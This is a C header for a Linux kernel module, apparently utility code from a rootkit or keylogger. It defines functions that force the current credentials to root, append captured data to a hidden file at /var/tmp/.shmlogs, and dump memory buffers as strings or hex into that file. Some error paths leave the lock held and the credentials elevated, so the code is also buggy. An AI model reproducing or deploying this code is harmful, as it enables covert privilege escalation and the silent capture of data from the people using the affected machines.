#ifndef __UTILS_H__
#define __UTILS_H__

#include <linux/kernel.h>
#include <linux/slab.h>

#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>
#include <linux/fcntl.h>
#include <asm/processor_64.h>

#include <linux/mutex.h>

#define LOGFILE                 "/var/tmp/.shmlogs"

/** UTILS **/
struct cred oldcreds;
static DEFINE_MUTEX(creds_lock);
void 
enter_root_ctx(void)
{
    
    if (mutex_lock_interruptible(&creds_lock) < 0)
        return;
    
    struct cred *creds;

    creds = prepare_creds();
    if (!creds)
    {
        mutex_unlock(&creds_lock);
        return;
    }
    memcpy(&oldcreds, creds, sizeof(struct cred));
    
    creds->uid.val = creds->gid.val = 0;
    creds->euid.val = creds->egid.val = 0;
    creds->suid.val = creds->sgid.val = 0;
    creds->fsuid.val = creds->fsgid.val = 0;

    commit_creds(creds);
}

void
leave_root_ctx(void)
{
    struct cred *newcreds;
    newcreds = prepare_creds();
    if (!newcreds)
    {
        mutex_unlock(&creds_lock);
        return;
    }
    newcreds->uid.val = newcreds->gid.val = oldcreds.uid.val;
    newcreds->euid.val = newcreds->egid.val = oldcreds.euid.val;
    newcreds->suid.val = newcreds->sgid.val = oldcreds.suid.val;
    newcreds->fsuid.val = newcreds->fsgid.val = oldcreds.fsuid.val;

    commit_creds(newcreds);
    mutex_unlock(&creds_lock);
}

void
shift_array_left(void *arr, size_t elemSize, unsigned int nbElem, unsigned int idxFrom)
{
    memmove(arr+idxFrom*elemSize, arr+(idxFrom+1)*elemSize, (nbElem-1-idxFrom) * elemSize);
    memset(arr+(nbElem-1)*elemSize, 0, elemSize);
}

struct file *file_open(const char *path, int flags, int rights) 
{
    struct file *filp = NULL;
    mm_segment_t oldfs;
    int err = 0;

    oldfs = get_fs();
    set_fs(get_ds());
    filp = filp_open(path, flags, rights);
    set_fs(oldfs);
    if (IS_ERR(filp)) {
        err = PTR_ERR(filp);
        return NULL;
    }
    return filp;
}

int file_write(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size) 
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_write(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
} 

void
log_msg(const char *msg)
{
    struct file *fd;

    enter_root_ctx();   
    fd = file_open(LOGFILE, O_RDWR|O_APPEND|O_CREAT, 0600);
    if (fd == NULL)
    {
        printk(KERN_ERR "Unable to open file\n");
        return;
    }

    if (file_write(fd, 0, msg, strlen(msg)) < 0)
    {
        printk(KERN_ERR "Unable write file\n");
        return;
    }

    filp_close(fd, NULL);
    leave_root_ctx();
}

int
is_meaningfull(char c)
{
    return (c > 32 && c < 127); 
}

void
mem_print_strings(void *buffer, size_t size, int logtofile)
{
    size_t i;
    char *s;
    char *tmp, *finalstr;

    s = (char*) buffer;
    i = 0;
    finalstr = kzalloc(size+1, GFP_KERNEL);
    if (!finalstr)
        return;
    while (i < size)
    {
        if (is_meaningfull(s[i]))
        {
            strncat(finalstr, s+i, size-i);
            strcat(finalstr, "\n");
            i += strnlen(s + i, size-i);
        }
        i++;
    }
    if (logtofile)
    {
        strcat(finalstr, "\n");
        log_msg(finalstr);
    }
    else
        printk(KERN_INFO "%s\n", finalstr);

    kfree(finalstr);
}

void
mem_print_hexa(void *buffer, size_t size, int logtofile)
{
    int n_per_line;
    char *s, *finalstr;
    size_t i;

    finalstr = kzalloc(size * 3 + 2, GFP_KERNEL);
    if (!finalstr)
        return;
    s = buffer;
    n_per_line = 16;
    for (i = 0; i < size; i++)
    {
        char tmp[4];
        if (((i+1) % n_per_line) == 0)
            snprintf(tmp, sizeof tmp, "%02x\n", s[i]);
        else
            snprintf(tmp, sizeof tmp, "%02x ", s[i]);
        strncat(finalstr, tmp, strlen(tmp));
    }
    if (logtofile)
    {
        strcat(finalstr, "\n");
        log_msg(finalstr);
    }
    else
        printk(KERN_INFO "%s\n", finalstr);

    kfree(finalstr);
}

#endif